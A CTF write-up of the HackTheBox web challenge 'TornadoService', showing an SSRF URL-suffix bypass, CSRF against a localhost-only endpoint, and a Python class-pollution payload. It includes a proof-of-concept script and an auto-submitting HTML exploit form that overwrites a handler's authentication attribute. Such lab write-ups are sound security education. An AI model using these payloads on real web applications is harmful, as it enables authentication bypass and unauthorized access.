---
title: Hackthebox Challenge - TornadoService
date: 2024-08-31
categories: [Writeups, Hackthebox Challenge]
tags: [CTF, Web, medium]
---

# TornadoService - MEDIUM

## Description

<Sup>Author: @leanthedev</sup><br>
You have found a portal of the recently arising tornado malware, it appears to have some protections implemented but a bet was made between your peers that they are not enough. Will you win this bet?

## TL;DR

The challenge involves a function called `update_tornados` in the `general.py` file, which is vulnerable to a Class Pollution attack.

In the `main.py` file, the `update_tornados` function can only be accessed from localhost. To exploit this, we need to use a CSRF attack to target the bot, sending a class pollution payload to corrupt the ProtectedContentHandler class.

## Solution

Upon first inspecting the code, I noticed that the flag is stored in the `ProtectedContentHandler` class. However, to access the flag, we need to set `self.current_user` to False.

```python
class ProtectedContentHandler(BaseHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

    def get(self):
    	self.set_header("Content-Type", "application/json")
    	if not self.current_user:
    		self.set_status(401)
    		self.write(json_response("Unauthorized access", "Unauthorized", error=True))
    		return

    	flag = read_file_contents("/flag.txt")
    	self.write(json_response(flag, "Success"))

```

This challenge provides a bot on the `report_tornado` endpoint. When you submit a report, the `bot.py` script will send a GET request to the IP address provided in the parameters, as shown in the code below.

```python
# Method GET /?ip=google.com
ip_param = self.get_argument("ip", None)
tornado_url = f"http://{ip_param}/agent_details"
```

This Python code is vulnerable to an SSRF attack. When I send a payload like:

```
0.0.0.0/something?a=
0.0.0.0/#
```

it combines with tornado_url, resulting in `http://0.0.0.0/something?a=/agent_details`, allowing me to bypass the URL suffix.

At this point, I wondered why this challenge provides me with a bot. After further investigation, I discovered the `UpdateTornadoHandler` class in `general.py`, which can only be accessed from localhost.

```python
class UpdateTornadoHandler(BaseHandler):
    [...]
	def post(self):
		self.set_header("Content-Type", "application/json")
		if not is_request_from_localhost(self):
			self.set_status(403)
			self.write(json_response("Only localhost can update tornado status.", "Forbidden", error=True))
			return

    [...]
```

The `UpdateTornadoHandler` class is vulnerable to CSRF because it lacks a CSRF token. Additionally, this class calls the `update_tornados(data, tornado)` function, which can be found in the `general.py` file.

```python
def update_tornados(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and type(value) == dict:
                update_tornados(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and type(value) == dict:
            update_tornados(value, getattr(updated, index))
        else:
            setattr(updated, index, value)
```

The update_tornados function is vulnerable to a Class Pollution attack. You can learn more about Class Pollution in Python [here](https://blog.abdulrah33m.com/prototype-pollution-in-python/).

To exploit this vulnerability, I need to leverage CSRF to trick the bot into sending a class pollution payload that corrupts the `ProtectedContentHandler` class.

Before executing the exploit, I created a playground to test my proof of concept (PoC) using a small Python script.

```python
class BaseClass:
    pass

class VulnClass:
    def __init__(self):
        pass

class WinClass(BaseClass):
    def checkWin(self):
        if self.win == "win":
            print("You win!")

def merge(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and type(value) == dict:
                merge(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and type(value) == dict:
            merge(value, getattr(updated, index))
        else:
            setattr(updated, index, value)

payload = {
    '__class__': {
        '__init__': {
            '__globals__': {
                'WinClass' : {
                    'win': 'win',
                }
            }
        }
    }
}

A = VulnClass()
merge(payload, A)

B = WinClass()
B.checkWin()
```

When I run this code, it prints `You win!`, which confirms that my proof of concept (PoC) is working.

Now, let's exploit this challenge.

### Exploit

```html
<html>
  <body>
    <form
      action="http://0.0.0.0:1337/update_tornado"
      method="POST"
      enctype="text/plain"
    >
      <input
        type="hidden"
        name='{"machine_id": "host-3222","ip_address": "0.0.0.0","status": "something", "__class__": {"__init__":{"__globals__":{"ProtectedContentHandler": {"current_user": "true" }}}},"a":"'
        value='"}'
      />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

I set up a server with the following HTML and sent the IP to the bot, successfully bypassing the URL suffix.

Now, when you access the `/stats` endpoint, the flag will be displayed.

> flag HTB{REDACTED}
